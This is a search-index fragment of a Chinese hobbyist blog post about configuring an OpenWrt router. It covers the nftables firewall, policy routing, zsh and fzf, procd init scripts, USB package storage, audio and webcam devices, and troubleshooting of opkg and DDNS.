<li>\u4e0d\u80fd\u6253\u5370fw4\uff0cnft\u751f\u6210\u7684\u89c4\u5219</li> <li>\u4f7f\u7528<code>iptables-save</code>\u6253\u5370\u6240\u6709table</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u914d\u7f6e\u6587\u4ef6_1","title":"\u914d\u7f6e\u6587\u4ef6","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"<p>[OpenWrt Wiki] Firewall configuration /etc/config/firewall - zone\uff1a\u5b9a\u4e49zone\u548c\u8def\u7531\u5668\u4e4b\u95f4(input, output)\uff0czone\u5185\u4e0d\u540c\u63a5\u53e3\u95f4\u7684(forward)\u89c4\u5219\u3002\u8fd8\u53ef\u4ee5\u5b9a\u4e49\u4ecezone\u51fa\u53bb\u7684masq - forward: \u5b9a\u4e49zone\u4e4b\u95f4\u7684\u8f6c\u53d1 - rule\uff1a\u7528\u4e8e\u6307\u5b9a\u7279\u5b9ahost\uff0c\u7aef\u53e3\u662f\u5426\u5141\u8bb8\u653e\u884c\uff0c\u76f8\u5f53\u4e8e\u5bf9zone\u66f4\u7ec6\u7c92\u5ea6\u7684\u8865\u5145\u3002 - redirect\uff1aSNAT\uff0cDNAT - include\uff1afw4(nftable), fw3(shell script\uff0c\u53ef\u4ee5\u4f7f\u7528iptable)</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ntftable\u5b9e\u73b0","title":"ntftable\u5b9e\u73b0","text":"<p>filter rules - input, forward, output - input_zone, forward_zone, output_zone - accept_from_zone, accept_to_zone <pre><code>        chain forward {\n                type filter hook forward priority filter; policy drop;\n\n                ct state established,related accept comment \"!fw4: Allow forwarded established and related flows\"\n                iifname { \"eth1\", \"wg0\", \"ztyou4dlov\" } jump forward_lan comment \"!fw4: Handle lan IPv4/IPv6 forward traffic\"\n                ...\n                jump handle_reject\n        }\n\n        chain forward_lan {\n                jump accept_to_wan comment \"!fw4: Accept lan to wan forwarding\"\n                jump accept_to_wg_s2s comment \"!fw4: Accept lan to wg_s2s forwarding\"\n                ct status dnat accept comment \"!fw4: Accept port forwards\"\n                jump accept_to_lan\n        }\n\n        chain accept_to_wan {\n                oifname \"eth0\" counter accept comment \"!fw4: accept wan IPv4/IPv6 traffic\"\n        }\n</code></pre></p> <p>nat rules - dstnat - srcnat - dstnat_zone - srcnat_zone <pre><code>        chain srcnat {\n                type nat hook postrouting priority srcnat; policy accept;\n                oifname { \"eth1\", \"wg0\", \"ztyou4dlov\" } jump srcnat_lan comment \"!fw4: Handle lan IPv4/IPv6 srcnat traffic\"\n                oifname \"eth0\" jump srcnat_wan comment \"!fw4: Handle wan IPv4/IPv6 srcnat traffic\"\n                oifname \"wg_s2s\" jump srcnat_wg_s2s comment \"!fw4: Handle wg_s2s IPv4/IPv6 srcnat traffic\"\n        }\n\n        chain srcnat_wg_s2s {\n                ip saddr 10.0.33.0/24 counter snat 10.0.33.2 comment \"!fw4: wg1-snat\"\n        }\n</code></pre></p> <p>raw rules mangle rules</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u81ea\u5b9a\u4e49\u89c4\u5219","title":"\u81ea\u5b9a\u4e49\u89c4\u5219","text":"<p>[OpenWrt Wiki] Firewall configuration /etc/config/firewall</p> <p>\u6709\u65f6\u4e0d\u6ee1\u8db3\u4e8e\u4f7f\u7528openwrt\u63d0\u4f9b\u7684\u65b9\u5f0f\u8bbe\u7f6e\u9632\u706b\u5899\uff0c\u800c\u60f3\u8981\u76f4\u63a5\u8fd0\u884ciptable\u547d\u4ee4\u6216\u8005nftable\u547d\u4ee4\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\u53ef\u4ee5\u4f7f\u7528<code>/etc/config/firewall</code>\u4e2d<code>include</code>\u7c7b\u578b\u7528\u4e8e\u81ea\u5b9a\u4e49\u89c4\u5219\u3002\u5305\u542b\u51e0\u79cd\u7c7b\u578b - nftable\u65b9\u5f0f\uff0c\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\u4fdd\u5b58nftable\u89c4\u5219 - scipt\u65b9\u5f0f\uff0c\u76f4\u63a5\u8fd0\u884ciptable\u6216\u8005nftable\u547d\u4ee4 \u7531\u4e8eopenwrt 22.04\u540enftable\u53d6\u4ee3\u4e86iptable\uff0c\u56e0\u6b64\u5b98\u65b9\u63a8\u8350\u4f7f\u7528nftable\u65b9\u5f0f\u3002</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#nftable_1","title":"nftable","text":"<p>\u5728\u6307\u5b9a\u4f4d\u7f6e\u63d2\u5165\u81ea\u5b9a\u4e49table\uff0cchain\u6216\u5219rule \u4f4d\u7f6e\uff1a</p> ruleset-pre At the very beginning, before the fw4 table definition ruleset-post At the very end, after the fw4 table definition table-pre At the beginning of the fw4 table, before any chain definition table-post At the end of the fw4 table, after all chains definition chain-pre At the beginning of $chain (defined in option chain), before rules in this chain chain-post At the end of $chain (defined in option chain), after rules in this chain <pre><code># /etc/config/firewall\nconfig include\n    option  type        'nftables'\n    option  path        '/etc/my_custom_firewall_rule.nft'\n    option  position    'chain-pre'\n    option  chain       'input_wan'\n\u00a0\n# /etc/my_custom_firewall_rule.nft\ntcp dport 0-1023 log prefix \"Inbound WAN connection attempt to low TCP port: \"\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#script","title":"script","text":"<p>\u53ef\u4ee5\u4f7f\u7528iptables\u547d\u4ee4\uff08fw3\uff09\u6216\u8005nftables\u547d\u4ee4 <pre><code>config include\n    option  enabled     1\n    option  type        'script'\n    option  path        '/etc/firewall.user'\n  option    fw4_compatible  1    # \u4f7f\u7528nftables\u547d\u4ee4\u9700\u8981\u6307\u5b9a\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u7b56\u7565\u8def\u7531","title":"\u7b56\u7565\u8def\u7531","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#gui\u914d\u7f6e\u6587\u4ef6","title":"GUI/\u914d\u7f6e\u6587\u4ef6","text":"<p>\u901a\u8fc7iproute2\u8bbe\u7f6e\u7684\u7b56\u7565\u8def\u7531\u4e0d\u77e5\u5982\u4f55\u4fdd\u5b58\u3002openwrt\u652f\u6301\u5176\u5b83\u7684\u65b9\u5f0f\u8bbe\u7f6e\uff0c\u5728luci\u4e2d\u53ef\u4ee5\u624b\u52a8\u6dfb\u52a0\u7b56\u7565\u8def\u7531\uff0c\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p></p> <p>\u4f1a\u5728<code>network</code>\u6587\u4ef6\u4e2d\u751f\u6210\u5982\u4e0b\u4e24\u6761 <pre><code>config rule\n        option priority '20'\n        option lookup '2'\n\nconfig route\n        option target '114.214.160.0/19'\n        option gateway '114.214.236.254'\n        option table '2'\n        option interface 'wan'\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u7cfb\u7edf","title":"\u7cfb\u7edf","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u57fa\u672c\u8f6f\u4ef6\u5305","title":"\u57fa\u672c\u8f6f\u4ef6\u5305","text":"<pre><code>git curl wget\nzsh vim-full  tmux\nmtr iperf3\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u4f7f\u7528zsh","title":"\u4f7f\u7528ZSH","text":"<p>\u53c2\u8003\uff1aInstall oh-my-zsh on openwrt/lede-project (github.com)</p> <p>\u5b89\u88c5\u5fc5\u8981\u7684\u5305 <pre><code>opkg update &amp;&amp; opkg install ca-certificates zsh curl git-http\n</code></pre></p> <p>\u5b89\u88c5oh-my-zsh\uff0c\u811a\u672c\u5b89\u88c5\u53ef\u80fd\u4f1a\u5361\u4f4f\uff0c\u53ef\u4ee5\u624b\u52a8\u5b89\u88c5\uff08\u89c1\u540e\uff09\u3002</p> <p>\u9009\u62e9zsh\u4e3a\u9ed8\u8ba4shell <pre><code>which zsh &amp;&amp; sed -i -- 's:/bin/ash:'`which zsh`':g' /etc/passwd\n</code></pre></p> <p>\u4e3a\u4e86\u907f\u514d\u56e0\u5220\u9664zsh\u5bfc\u81f4\u65e0\u6cd5\u767b\u5f55\uff0c\u53ef\u4ee5\u5728\u542f\u52a8\u811a\u672c<code>/etc/rc.local</code>\u4e2d\u8bbe\u7f6e\u81ea\u52a8fallback\u56deash <pre><code># Revert root shell to ash if zsh is not available\nif grep -q '^root:.*:/usr/bin/zsh$' /etc/passwd &amp;&amp; [ ! -x /usr/bin/zsh ]; then\n    # zsh is root shell, but zsh was not found or not executable: revert to default ash\n    [ -x /usr/bin/logger ] &amp;&amp; /usr/bin/logger -s \"Reverting root shell to ash, as zsh was not found on the system\"\n    sed -i -- 's:/usr/bin/zsh:/bin/ash:g' /etc/passwd\nfi\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#oh-my-zsh\u624b\u52a8\u5b89\u88c5","title":"oh-my-zsh\u624b\u52a8\u5b89\u88c5","text":"<p>\u901a\u5e38\u6765\u8bf4curl\u83b7\u5f97install\u811a\u672c\u65f6\u4f1a\u5361\u4f4f\uff0cgit clone\u4ed3\u5e93\u65f6\u4e5f\u53ef\u80fd\u5361\u4f4f\uff0c\u6b64\u65f6\u4e0d\u5982\u624b\u52a8\u5b89\u88c5\uff0c\u67e5\u770binstall\u811a\u672c\uff0c\u4f1a\u53d1\u73b0\u5176\u5b9e\u53ea\u505a\u4e86\u51e0\u4ef6\u4e8b\u60c5\uff1a - \u5c06oh-my-zsh\u4ed3\u5e93\u514b\u9686\u5230$HOME\u4e0b<code>.oh-my-zsh</code>   - \u53ef\u4ee5\u4ece\u5176\u4ed6\u8ba1\u7b97\u673ascp\u5230\u8def\u7531\u5668\u91cc - \u590d\u5236zshrc\u6587\u4ef6\uff1a<code>cp .oh-my-zsh/templates/zshrc.zsh-template .zshrc</code>   - \u76f4\u63a5\u590d\u5236\u5373\u53ef\uff0c\u4e0d\u7528\u4fee\u6539\u5185\u5bb9 - chsh   - openwrt\u6ca1\u6709chsh\u547d\u4ee4\uff0c\u9700\u8981\u4fee\u6539/etc/passwd   - \u6ce8\u610f\uff0c\u5982\u679c\u4fee\u6539\u9519\u8bef\uff08\u5982\u76f4\u63a5\u8f93\u5165zsh\u800c\u4e0d\u662f\u4ece\u6839\u5f00\u59cb\u7684\u5b8c\u6574\u8def\u5f84\uff09\u53ef\u80fd\u5bfc\u81f4\u65e0\u6cd5\u767b\u5f55openwrt</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#fzf\u624b\u52a8\u5b89\u88c5","title":"fzf\u624b\u52a8\u5b89\u88c5","text":"<p>\u60f3\u529e\u6cd5\u83b7\u5f97fzf\u4ed3\u5e93\uff0c\u53ef\u4ee5\u4ecex86\u7535\u8111scp\u3002 <pre><code>git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf\n~/.fzf/install  # \u4f9d\u8d56bash\uff0c\u53ef\u4ee5\u624b\u52a8\u6539\u4e3azsh\uff0c\u4f1a\u4e0b\u8f7dfzf\u53ef\u6267\u884c\u7a0b\u5e8f\u3002\u590d\u5236\u5230/bin\u76ee\u5f55\n</code></pre></p> <p>\u521b\u5efa.fzf.zsh\u6587\u4ef6 <pre><code># Auto-completion\n# ---------------\n[[ $- == *i* ]] &amp;&amp; source \"/root/.fzf/shell/completion.zsh\" 2&gt; /dev/null\n\n# Key bindings\n# ------------\nsource \"/root/.fzf/shell/key-bindings.zsh\"\n</code></pre></p> <p>zshrc\u4e2d\u6dfb\u52a0 <pre><code># fzf\n[ -f ~/.fzf.zsh ] &amp;&amp; source ~/.fzf.zsh\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#procd","title":"procd","text":"<ul> <li>\u6587\u6863\uff1a[OpenWrt Wiki] procd init scripts</li> <li>\u4f8b\u5b50\u8bb2\u89e3\uff1a[OpenWrt Wiki] Create a sample procd init script</li> </ul> <p>procd\u662f\u7528\u4e8e\u66ff\u4ee3init\u7684\u7cfb\u7edf\u542f\u52a8\u7ba1\u7406\u8f6f\u4ef6\uff08\u8fdb\u7a0b\u53f7\u4e3a1\uff0c\u547d\u4ee4/sbin/procd\uff09</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u793a\u4f8b","title":"\u793a\u4f8b","text":"<ul> <li>START\u7528\u4e8e\u63a7\u5236\u542f\u52a8\u987a\u5e8f\uff08\u4ece\u5c0f\u5230\u5927\u542f\u52a8\uff09</li> <li>\u901a\u8fc7<code>ls -al /etc/rc.d/</code>\u67e5\u770b\u542f\u52a8\u987a\u5e8f</li> <li>procd\u4f7f\u7528openwrt UCI\u914d\u7f6e\u63a5\u53e3\u3002\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e<code>/etc/config/myservice</code>\uff0c\u901a\u8fc7<code>CONFIGURATION=myservice</code>\u6307\u5b9a</li> <li><code>procd_set_param command</code>\u8bbe\u7f6e\u670d\u52a1\u8fd0\u884c\u547d\u4ee4</li> <li><code>procd_set_param stdout 1</code>\u5c06\u8f93\u51fa\u91cd\u5b9a\u5411\u5230logd\u3002\u901a\u8fc7logread\u67e5\u770b <pre><code>#!/bin/sh /etc/rc.common\n\u00a0\nUSE_PROCD=1\n\u00a0\nSTART=95\nSTOP=01\n\u00a0\nCONFIGURATION=myservice\n\u00a0\nstart_service() {\n    # Reading config\n    config_load \"${CONFIGURATION}\"\n    local name\n    local every\n\u00a0\n    config_get name hello name\n    config_get every hello every\n\u00a0\n    procd_open_instance\n\u00a0\n    # pass config to script on start\n    procd_set_param command /bin/sh \"/var/myscript.sh\" \"$name\" \"$every\"\n    procd_set_param file /etc/config/myservice\n    procd_set_param stdout 1\n    procd_set_param stderr 1\n    procd_close_instance\n}\n</code></pre></li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ssh-key\u767b\u5f55","title":"ssh key\u767b\u5f55","text":"<ul> <li>\u4e00\u822c\u53d1\u884c\u7248\u672c\u7684 Linux \u7cfb\u7edf\u90fd\u662f\u4f7f\u7528\u7684 <code>sshd</code> \u4f5c\u4e3a ssh \u670d\u52a1\u7aef\uff0c\u6211\u4eec\u5c06\u5ba2\u6237\u7aef\u7684 <code>~/.ssh/id_rsa.pub</code> \u62f7\u8d1d\u5230\u670d\u52a1\u7aef\u7684 <code>~/.ssh/authorized_keys</code> \u5373\u53ef</li> <li>openwrt \u4f7f\u7528\u7684 <code>dropbear</code> \u4f5c\u4e3a ssh \u7684\u670d\u52a1\u7aef\u7a0b\u5e8f\uff0c\u6211\u4eec\u9700\u8981\u5c06\u516c\u94a5\u62f7\u8d1d\u5230 <code>/etc/dropbear/authorized_keys</code>\uff0c\u6700\u597d\u4fdd\u8bc1\u5176\u6587\u4ef6\u6743\u9650\u662f 644</li> </ul> <p>\u6216\u8005\u4f7f\u7528luci\u754c\u9762System--&gt;Admin--&gt;SSH key\u6dfb\u52a0</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u589e\u5927\u65e0\u7ebf\u7684\u53d1\u5c04\u529f\u7387","title":"\u589e\u5927\u65e0\u7ebf\u7684\u53d1\u5c04\u529f\u7387","text":"<p>\u4fee\u6539\u8def\u7531\u5668\u7684\u56fd\u5bb6\u5730\u533a\uff0c\u4f7f\u5f97\u65e0\u7ebf\u7684\u529f\u7387\u66f4\u5927\uff0c\u56e0\u6b64\u4fe1\u53f7\u66f4\u597d\u3002</p> <p>Network--&gt;Wireless\u4e2d\u9009\u62e9Edit 2.4Ghz\u548c5Ghz\u7f51\u7edc\uff0c\u5728Advanced Setting\u4e2d\u8bbe\u7f6eCountry Code\uff0c\u53ef\u4ee5\u4fee\u6539\u4e3aUS\u3002\u8fd9\u68372.4Ghz\u548c5Ghz\u4fe1\u53f7\u529f\u7387\u53d8\u4e3a30dBm\u548c26dBm</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u8f6f\u4ef6\u5b89\u88c5\u5728usb\u4e0a","title":"\u8f6f\u4ef6\u5b89\u88c5\u5728usb\u4e0a","text":"<p>\u6b63\u5e38\u60c5\u51b5\uff0c\u8def\u7531\u5668\u7684flash\u90fd\u5f88\u5c0f\uff0c\u6bd4\u598216MB\uff0c\u5f88\u96be\u88c5\u4e0b\u591a\u5c11\u8f6f\u4ef6\u3002\u4f46\u662f\u5982\u679c\u8def\u7531\u5668\u6709USB\u63a5\u53e3\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u63d2\u4e0aU\u76d8\u4f5c\u4e3a\u989d\u5916\u7684\u5b58\u50a8\u7a7a\u95f4\u3002\u4ee5GB\u4e3a\u5355\u4f4d\u540e\uff0c\u5c31\u53ef\u4ee5\u968f\u610f\u5b89\u88c5\u8f6f\u4ef6\u4e86\u3002 \u8fc7\u7a0b\uff1a</p> <ol> <li> <p><code>/etc/opkg.conf</code>\u4e2d\u6dfb\u52a0usb dest    <pre><code>#/etc/opkg.conf\ndest root /\ndest usb /mnt/sdb1       #\u6dfb\u52a0\u6b64\u884c, sdb1\u4e3a\u6302\u8f7d\u7684U\u76d8\u4f4d\u7f6e\ndest ram /tmp\nlists_dir ext /var/opkg-lists\noption overlay_root /overlay\noption check_signature\n</code></pre></p> </li> <li> <p>opkg\u5b89\u88c5\u8f6f\u4ef6\u65f6\uff0c\u6dfb\u52a0<code>-d usb</code>\u9009\u9879\uff0c\u5982\u5b89\u88c5python    <pre><code>opkg install -d usb python3 python3-pip\n</code></pre></p> </li> <li> <p>\u4e0d\u77e5\u4e3a\u4f55\uff0c\u5b89\u88c5\u5728usb\u4e0a\u65f6\uff0copkg\u521b\u5efa\u8f6f\u94fe\u63a5\u65f6\u4f1a\u62a5\u9519\uff0c\u5bfc\u81f4\u76f4\u63a5\u8fd0\u884c\u547d\u4ee4\u4f1a\u62a5\u9519\u3002\u56e0\u6b64\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u624b\u52a8\u521b\u5efa\u8f6f\u8fde\u63a5\uff0c\u5982python\u9700\u8981\u521b\u5efa\u4ee5\u4e0b\u8f6f\u8fde\u63a5    <pre><code>ln -s /mnt/sdb1/usr/bin/python3.9 /usr/bin/python3\nln -s /mnt/sdb1/usr/lib/libpython3.9.so.1.0 /usr/lib/libpython3.9.so.1.0\n\nln -s /mnt/sdb1/usr/bin/pip3.9 /usr/bin/pip\nln -s /mnt/sdb1/usr/bin/pip3.9 /usr/bin/pip3\n</code></pre></p> </li> </ol>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u5176\u5b83_1","title":"\u5176\u5b83","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#webcam\u8bbe\u5907","title":"webcam\u8bbe\u5907","text":"<pre><code>kmod-video-core kmod-video-uvc\n\nluci-app-mjpg-streamer  # mjpg-streamer\u7684\u6bcf\u4e2a\u7ec4\u4ef6\u9700\u8981\u5355\u72ec\u5b89\u88c5\nmjpg-streamer mjpg-streamer-input-uvc mjpg-streamer-output-http mjpg-streamer-www-simple\n</code></pre> <pre><code>root@p2w:~# opkg list-installed |grep usb\nkmod-usb-audio - 5.10.161-1\nkmod-usb-core - 5.10.161-1\nkmod-usb-dwc3 - 5.10.161-1\nkmod-usb-dwc3-qcom - 5.10.161-1\nkmod-usb-storage - 5.10.161-1\nkmod-usb-xhci-hcd - 5.10.161-1\nkmod-usb3 - 5.10.161-1\nroot@p2w:~# opkg list-installed |grep video\nkmod-video-core - 5.10.161-1\nkmod-video-uvc - 5.10.161-1\nkmod-video-videobuf2 - 5.10.161-1\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u97f3\u9891\u8bbe\u5907","title":"\u97f3\u9891\u8bbe\u5907","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u9a71\u52a8","title":"\u9a71\u52a8","text":"<pre><code>opkg install kmod-usb-audio (kmod-sound-core)\n</code></pre> <p>\u6b64\u65f6\u5df2\u7ecf\u6709\u9a71\u52a8\u4e86\uff0c\u901a\u8fc7<code>/proc/asound</code>\u67e5\u770b\u8bbe\u5907 <pre><code>root@p2w:~# cat /proc/asound/cards\n 0 [Lanseyaoji     ]: USB-Audio - Lanseyaoji\nFEC Lanseyaoji at usb-xhci-hcd.0.auto-1, high speed\n</code></pre></p> <p>\u5b89\u88c5alsa-utils\uff0c\u53ef\u4ee5\u4f7f\u7528arecord, aplay\u5de5\u5177</p> <p>arecord, aplay - command-line sound recorder and player for ALSA soundcard driver</p> <pre><code>opkg install alsa-utils\n\nroot@p2w:~# opkg files alsa-utils\nPackage alsa-utils (1.2.6-1) is installed on root and has the following files:\n/usr/share/alsa/init/ca0106\n/usr/bin/amixer\n/usr/share/alsa/init/test\n/usr/share/alsa/init/info\n/usr/share/alsa/init/hda\n/usr/bin/alsamixer\n/usr/share/alsa/init/default\n/usr/bin/arecord\n/usr/share/alsa/init/00main\n/usr/share/alsa/init/help\n/usr/bin/aplay\n/usr/sbin/alsactl\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#alsa-utils","title":"alsa-utils","text":"<p><code>arecord -d 10 -f cd -t wav -D copy foobar.wav</code> will record foobar.wav as a 10-second, CD-quality wave file</p> <p><code>arecord -f cd -t wav --max-file-time 3600 --use-strftime %Y/%m/%d/listen-%H-%M-%v.wav</code> Record in stereo from the default audio source. Create a new file every hour. The files are placed in directories based on their start dates and have names which include their start times and file numbers.</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#pulseaudio","title":"pulseaudio","text":"<p>\u60f3\u8981\u8fbe\u5230\u7684\u6548\u679c\uff1a\u5728windows\u4e0a\u5b9e\u65f6\u76d1\u542c\u8def\u7531\u5668usb\u9ea6\u514b\u98ce\u7684\u97f3\u9891\u3002 \u5b9e\u73b0\u7684\u6548\u679c\uff1a\u5728linux\u4e0a\u5b9e\u65f6\u76d1\u542c\u8def\u7531\u5668usb\u9ea6\u514b\u98ce\u7684\u97f3\u9891\u3002</p> <ul> <li> <p>\u5b89\u88c5pulseaudio\uff1a[OpenWrt Wiki] PulseAudio <pre><code>opkg install pulseaudio-tools pulseaudio-profiles\n\nroot@p2w \\u@\\h:\\w\\$ opkg list-installed |grep pulse                                                                                                                                                                                                                               19:04:09\npulseaudio-daemon-avahi - 14.2-8\npulseaudio-profiles - 14.2-8\npulseaudio-tools - 14.2-8\n</code></pre></p> </li> <li> <p>\u4fee\u6539system.pa\uff08system\u6a21\u5f0f\u542f\u52a8\u4f7f\u7528\u8be5\u6587\u4ef6\uff0cper-user\u6a21\u5f0f\u542f\u52a8\u4f7f\u7528default.pa\uff09 <pre><code>vim /etc/pulse/system.pa\n\n# \u5f00\u542ftcp\u8bbf\u95ee\uff0c\u6709\u51e0\u79cd\u4e0d\u540c\u7684\u8bbf\u95ee\u63a7\u5236\n\n#load-module module-native-protocol-tcp # server\u548cclient\u9700\u8981\u6709\u76f8\u540c\u7684cookie\uff0c\u4f4d\u4e8e`~/.config/pulse/cookie`\nload-module module-native-protocol-tcp auth-anonymous=1  # \u5141\u8bb8\u533f\u540d\n#load-module module-native-protocol-tcp auth-ip-acl=127.0.0.1;192.168.0.0/24 # \u901a\u8fc7ip\u8bbf\u95ee\u63a7\u5236\n</code></pre></p> </li> <li> <p>\u542f\u52a8pulseaudio <pre><code>service pulseaudio start  # \u4f1a\u4ee5system\u6a21\u5f0f\u542f\u52a8\uff08ps\u547d\u4ee4\u884c\u4e2d\u53ef\u4ee5\u770b\u5230--system\uff09, pactl\u65e0\u6cd5\u4f7f\u7528\n\nps |grep pulseaudio\n</code></pre></p> </li> <li> <p>\u5728client\u4e0a\uff08\u6bd4\u5982linux\u7b14\u8bb0\u672c\uff09\uff0c\u5b9e\u65f6\u64ad\u653e\u97f3\u9891 <pre><code>#load-module module-tunnel-sink server=192.168.36.230\nload-module module-tunnel-source server=192.168.36.230\n</code></pre></p> </li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#\u7cfb\u7edf\u65f6\u95f4\u5bfc\u81f4opkg\u65e0\u6cd5\u4e0b\u8f7d","title":"\u7cfb\u7edf\u65f6\u95f4\u5bfc\u81f4opkg\u65e0\u6cd5\u4e0b\u8f7d","text":"<p>\u901a\u8fc7wget url\uff0c\u53d1\u73b0\u4ee5\u4e0b\u9519\u8bef <pre><code>Connection error: Invalid SSL certificate\n</code></pre></p> <p>\u67e5\u627eSSL \u8bc1\u4e66\u9519\u8bef\u539f\u56e0\uff0c\u6709\u4e00\u9879\u662f\u7cfb\u7edf\u65f6\u95f4\u4e0d\u4e00\u81f4\u5bfc\u81f4\u7684\u3002 \u5728openwrt System -&gt; System Localtime\u4e2d\uff0c\u53ef\u4ee5\u9009\u62e9sync with browser\u3002\u540c\u6b65\u540e\u95ee\u9898\u89e3\u51b3\u3002</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ddns-curl-48\u9519\u8bef","title":"ddns curl 48\u9519\u8bef","text":"<p>\u5bfc\u81f4ddns\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c <pre><code>Sat May  6 23:28:44 2023 user.warn ddns-scripts[12337]: FreeDNS: Transfer failed - retry 7/0 in 60 seconds\nSat May  6 23:29:41 2023 user.err ddns-scripts[11285]: FreeDNS_2_ipv6: cURL Error: '48'\n</code></pre></p> <p>\u9700\u8981\u66f4\u65b0curl\uff1aUsing curl/libcurl4 for sending mails - Installing and Using OpenWrt - OpenWrt Forum</p> <p>Error code 48 in curl refers to \"<code>An unknown option was passed in to libcurl</code>\", which would be in line with OpenWrt's tendency to disable optional features for size reasons (apparently you can enable\u00a0<code>LIBCURL_SMTP</code>\u00a0when building from source).</p> <p>\u56fe\u5f62\u5316\u754c\u9762\u66f4\u65b0curl\u548clibcurl</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#ddns\u65e0\u6cd5\u81ea\u52a8\u542f\u52a8","title":"ddns\u65e0\u6cd5\u81ea\u52a8\u542f\u52a8","text":"<p>\u770b\u523022.03\u8fd8\u6709\u4eba\u9047\u5230\u4e00\u6837\u95ee\u9898\uff1a[OpenWrt Wiki] DDNS client \u624b\u52a8\u91cd\u542fddns\u670d\u52a1\u53ef\u4ee5\uff0c\u4f46\u662f\u91cd\u542f\u8def\u7531\u5668\u540e\uff0cddns\u4ecd\u7136\u4e0d\u5728\u8fd0\u884c\u3002</p> <p>\u4fee\u6539\u4e86procd\u987a\u5e8f\u4ecd\u7136\u4e0d\u884c\uff0c\u6682\u65f6\u901a\u8fc7rc.local\u4e2d\u624b\u52a8\u91cd\u542fddns\u89e3\u51b3 <pre><code>vim /etc/rc.local\n\nservice ddns restart\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E9%85%8D%E7%BD%AE/#luci-proto\u5b89\u88c5\u540e\u4e0d\u663e\u793a","title":"luci-proto\u5b89\u88c5\u540e\u4e0d\u663e\u793a","text":"<p>Luci-proto won't appear in LuCI after installation - Installing and Using OpenWrt - OpenWrt Forum <pre><code>/etc/init.d/network restart\n</code></pre></p> 